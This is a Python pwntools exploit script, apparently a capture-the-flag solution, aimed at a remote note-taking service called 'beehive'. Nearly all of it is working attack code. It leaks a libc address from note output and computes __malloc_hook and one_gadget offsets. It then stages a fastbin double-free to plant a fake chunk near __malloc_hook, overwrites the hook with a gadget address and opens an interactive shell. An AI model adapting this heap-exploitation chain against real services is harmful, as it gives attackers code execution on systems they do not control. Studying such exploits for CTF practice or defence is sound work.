# -*- coding: utf-8 -*-
# @Author: madrat
# @Date:   2019-08-16 20:36:35

from pwn import *
import sys

local = False

context.terminal = ['tmux', 'splitw', '-v']

if local:
    elf = ELF('./../beehive.out')
    ps = process('./../beehive.out')
else:
    ps = remote(sys.argv[1], int(sys.argv[2]))

'''
struct vector // Simple C struct as example (T is the type supplied by the template) 
{
    T *begin;        // vector::begin() probably returns this value
    T *end;          // vector::end()   probably returns this value
    T *end_capacity; // First non-valid address
    // Allocator state might be stored here (most allocators are stateless)
}
'''

def view_notes():
    ps.sendline('view_notes')
    return ps.recvuntil('> ')

def select_date(month, day):
    time.sleep(0.03)
    ps.sendline('select_date')
    ps.recv()
    ps.sendline(str(month))
    ps.recv()
    ps.sendline(str(day))
    ps.recv()

def create_note(name, content, content_size):
    time.sleep(0.03)
    ps.sendline('create_note')
    ps.recv()
    ps.sendline(name)
    ps.recv()
    ps.sendline(str(content_size))
    ps.recv()
    ps.sendline(content)
    ps.recv()

def delete_note(idx):
    time.sleep(0.03)
    ps.sendline('delete_note')
    ps.recv()
    ps.sendline(str(idx))
    ps.recv()

def copy_notes(month, day):
    time.sleep(0.03)
    ps.sendline('copy_notes')
    ps.recv()
    ps.sendline(str(month))
    ps.recv()
    ps.sendline(str(day))
    ps.recv()

def double_free_fast():
    # first day
    select_date(2, 1)
    create_note(p64(0x0) * 15, 'BBBB' * 24, 600)
    create_note(p64(0x0) * 15, 'CCCC' * 24, 600)
    create_note(p64(0x0) * 15, 'DDDD' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    create_note(p64(0x0) * 15, 'FFFF' * 24, 600)
    copy_notes(2, 2)
    create_note(p64(0x0) * 15, 'EEEE' * 24, 600)

    # second day
    select_date(2, 3)
    create_note('AAAA' * 31, 'BBBB' * 24, 600)
    create_note('BBBB' * 31, 'CCCC' * 24, 600)
    create_note('CCCC' * 31, 'DDDD' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('EEEE' * 31, 'FFFF' * 24, 600)
    create_note('FFFF' * 31, 'EEEE' * 24, 600)

    # third day
    select_date(2, 2)
    create_note('FFFF' * 31, 'EEEE' * 24, 600)

def exploit_df_fast(chunk_to_get, size):
    select_date(2, 4)
    create_note(p64(chunk_to_get), p64(chunk_to_get) + p64(chunk_to_get) + 'A' * 30, size)
    create_note(p64(0x0) * 15, p64(0x0), size)
    create_note(p64(0x0) * 15, p64(0x0), size)

def generate_vec(cnt):
    for i in range(cnt):
        create_note(p64(0x60AF30) * 15, p64(0x60AF30) * 12, 100)

def generate_vec_param(cnt, name, content_size, content):
    for i in range(cnt):
        create_note(name, content, content_size)

def main():
    ps.recv()

    generate_vec(13)
    copy_notes(1, 3)
    generate_vec(1)

    select_date(1, 2)
    generate_vec(15)

    select_date(1, 3)
    create_note(p64(0x60AF30), 'D' * 16, 140)

    leak = u64(view_notes()[560:560+6] + '\x00\x00') # view_notes()[1673:1673+6] + 
    data_base     = leak + 0x38ec40      # libc .data base 
    libc_base     = data_base - 0x3c4000 # libc .text base
    free_hook     = data_base + 0x27a8   # __free_hook
    malloc_hook   = data_base + 0xb10    # __malloc_hook
    fake_chunk_1  = data_base + 0x2795   # near __free_hook,   size 0x7f
    fake_chunk_2  = data_base + 0xb05    # near __malloc_hook, size 0x7f
    fake_chunk_3  = data_base + 0xaed    # near __malloc_hook, size 0x7f

    one_gadget_1 = libc_base + 0x45216 # rax == NULL
    one_gadget_2 = libc_base + 0x4526a # [rsp+0x30] == NULL
    one_gadget_3 = libc_base + 0xf02a4 # [rsp+0x50] == NULL
    one_gadget_4 = libc_base + 0xf1147 # [rsp+0x70] == NULL

    one_gadget_test = libc_base + 0x6F5A6

    binary_gadget = 0x405D4D

    system = libc_base + 0x44E20

    log.success('Libc address leak: 0x%x', leak)
    log.success('Libc .data base:   0x%x', data_base)
    log.success('Libc .text base:   0x%x', libc_base)
    log.success('__free_hook:       0x%x', free_hook)
    log.success('__malloc_hook:     0x%x', malloc_hook)

    log.success('Fakechunks near __free_hook:')
    log.failure('  1. size: 0x7f (doesnt work):  0x%x', fake_chunk_1)

    log.success('Fakechunks near __malloc_hook:')
    log.success('  1. size: 0x7f:  0x%x', fake_chunk_2)
    log.success('  2. size: 0x7f:  0x%x', fake_chunk_3)

    double_free_fast()

    select_date(2, 4)
    exploit_df_fast(fake_chunk_3, 102)

    create_note('AAAAAAAA', 'A' * 19 + p64(binary_gadget), 102)
    ps.interactive()

if __name__ == "__main__":
    main()
